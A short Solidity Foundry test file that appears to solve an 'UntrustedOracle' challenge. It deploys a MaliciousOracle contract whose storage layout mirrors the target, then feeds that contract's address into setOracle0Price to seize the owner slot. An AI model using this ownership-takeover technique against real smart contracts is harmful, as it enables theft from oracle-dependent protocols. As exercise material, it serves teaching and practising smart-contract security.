// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";

import {UntrustedOracleBaseTest} from "./UntrustedOracleBase.t.sol";

contract UntrustedOracleTest is UntrustedOracleBaseTest {
    function testExploit() external validation {
        // TODO
        MaliciousOracle maliciousOracle = new MaliciousOracle();
        oracle.setOracle0Price(uint256(uint160(address(maliciousOracle))));
        oracle.setOracle0Price(0);
    }
}

contract MaliciousOracle {
    address public oracle0;
    address public oracle1;

    uint256 public finalPrice;
    address public owner;

    function setOraclePrice(uint256 _price) external {
        owner = msg.sender;
    }
}
